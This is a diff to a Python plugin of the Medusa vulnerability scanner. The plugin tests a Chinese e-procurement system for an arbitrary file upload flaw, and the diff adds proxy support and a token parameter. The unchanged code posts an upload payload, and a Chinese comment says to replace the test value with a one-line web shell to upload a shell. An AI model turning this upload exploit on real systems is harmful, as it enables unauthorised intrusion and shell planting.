@@ -7,7 +7,6 @@ __author__ = 'Ascotbe'
 __times__ = '2019/10/13 22:12 PM'
 import urllib.parse
 import requests
-import re
 import ClassCongregation
 class VulnerabilityInfo(object):
     def __init__(self,Medusa):
@@ -32,7 +31,8 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-def medusa(Url,RandomAgent,UnixTimestamp):
+def medusa(Url,RandomAgent,Token,proxies=None):
+    proxies=ClassCongregation.Proxies().result(proxies)
 
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
@@ -62,14 +62,14 @@ testvul
         }
 
         s = requests.session()
-        resp = s.post(payload_url,data=data,headers=headers, timeout=6, verify=False)
+        resp = s.post(payload_url,data=data,headers=headers, proxies=proxies,timeout=6, verify=False)
         con = resp.text
         code=resp.status_code
         #如果要上传shell直接把testvul这个值改为一句话就可以
         if code == 200 and con.lower().find("9d37b73795649038.cer") != -1:
             Medusa = "{}存在一采通电子采购系统任意文件上传漏洞\r\n 验证数据:\r\nshell地址:{}\r\n内容:{}\r\n".format(url,payload_url,shell)
             _t=VulnerabilityInfo(Medusa)
-            ClassCongregation.VulnerabilityDetails(_t.info, url,UnixTimestamp).Write()  # 传入url和扫描到的数据
+            ClassCongregation.VulnerabilityDetails(_t.info, url,Token).Write()  # 传入url和扫描到的数据
             ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
